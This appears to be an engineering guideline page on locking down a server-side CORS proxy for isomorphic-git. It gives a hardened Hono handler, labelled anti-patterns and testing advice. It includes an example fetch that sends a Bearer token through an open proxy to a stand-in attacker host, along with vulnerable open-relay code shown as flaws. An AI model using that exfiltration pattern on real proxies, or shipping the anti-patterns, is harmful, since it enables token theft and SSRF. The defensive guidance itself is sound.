---
title: 'A proxy endpoint pins its targets or it is an open relay'
category: platform
summary: 'Any server-side proxy that builds its upstream URL from the request must allowlist hosts and paths, validate Origin, and strip cookies — or it forwards your users'' credentials to whoever asks.'
principle: 'Every proxy validates three things before fetching: the target host (allowlist), the target path (narrowest pattern that serves the feature), and the caller''s Origin; it strips cookies and forwards auth headers only to the pinned host.'
severity: non-negotiable
tags: [platform, proxy, ssrf, cors, workers, security]
sources:
  - project: 'a content-admin SPA'
    date: 2026-06-11
    note: 'In-app CORS proxy for isomorphic-git shipped without the host pin its standalone predecessor had; audit found an open relay forwarding Authorization to arbitrary hosts.'
related:
  - platform/cross-origin-auth-survives-cookie-blocking
  - error-handling/always-check-res-ok
order: 5
updated: 2026-06-11
---

A browser cannot talk git smart-HTTP to GitHub directly, because GitHub serves no
CORS headers on those endpoints, so an admin SPA that runs isomorphic-git in a
Service Worker needs a tiny server-side proxy. The proxy receives
`/api/cors/github.com/owner/repo/info/refs`, fetches
`https://github.com/owner/repo/info/refs`, and reflects CORS headers back. About
twenty lines of Hono.

A security audit on a content-admin SPA (2026-06-11) found the problem. The deployed
proxy built its target as `https://${path}` straight from the request path with no
validation, reflected any `Origin` header, and copied every inbound header to
the upstream fetch, `Authorization` and `Cookie` included. That one endpoint opened
three separate attacks:

- Credential exfiltration. `fetch('https://admin.example/api/cors/attacker.tld/x',
  {headers: {Authorization: 'Bearer ' + token}})` — the worker delivers the
  token to the attacker's server.
- SSRF / anonymising relay. The outbound fetch originates from the edge worker.
  Any third-party API, any internal surface reachable from that network, now has the
  worker as a free proxy in front of it.
- Cross-site abuse. With `Access-Control-Allow-Origin` reflected, any website a
  visitor opens can drive the proxy from their browser.

The standalone Worker this code replaced had the host pin and the Origin allowlist.
Both protections vanished when the proxy was ported into the main app, because nobody
re-derived the threat model for "the same code, but mounted at /api". Review a port
the way you reviewed the original.

## How to apply

Pin all three dimensions in code, right where the fetch happens, not in a comment:

```ts
// Narrowest pattern that serves the feature: git smart-HTTP only.
const GIT_SMART_HTTP =
  /^github\.com\/[\w.-]+\/[\w.-]+\/(info\/refs|git-upload-pack|git-receive-pack)$/

const ALLOWED_ORIGINS = new Set([
  'https://admin.example.org',
  'https://dev-admin.example.org',
])

export const corsProxy = async (c: Context): Promise<Response> => {
  const origin = c.req.header('Origin')
  if (origin !== undefined && !ALLOWED_ORIGINS.has(origin))
    return new Response('Origin not allowed', { status: 403 })
  const path = c.req.path.replace('/api/cors/', '')
  if (!GIT_SMART_HTTP.test(path))
    return new Response('Target not allowed', { status: 403 })
  const headers = new Headers(c.req.raw.headers)
  headers.delete('host')
  headers.delete('cookie') // session cookie must never reach the upstream
  return fetch(`https://${path}${new URL(c.req.url).search}`, {
    method: c.req.method,
    headers,
  })
}
```

The path regex pulls double duty. It pins the host (the string must start with
`github.com/`) and the path shape (only the three endpoints isomorphic-git
actually calls). `Authorization` still flows, which is the proxy's job, but it
can only ever reach the pinned host.

## Anti-patterns

```ts
// Open relay: host comes from the attacker.
const target = `https://${c.req.path.replace('/api/cors/', '')}`

// Reflecting any origin: every website can use your proxy.
out.headers.set('Access-Control-Allow-Origin', c.req.header('Origin') ?? '*')

// Forwarding the full header set: cookies and auth go wherever the path says.
const headers = new Headers(c.req.raw.headers)
```

The first one announces itself when your worker shows up in someone's SSRF writeup.
The other two give you nothing: exfiltration through a permissive proxy produces no
error on your side, so it can run unnoticed.

## Enforcement

Unit tests are cheap and direct here. Assert that a foreign host returns 403 *and
the fetch mock was never called*, that a github path outside smart-HTTP returns 403,
and that `Cookie` is stripped while `Authorization` survives. Keep the allowlist in
its own module so the tests read as the security spec.
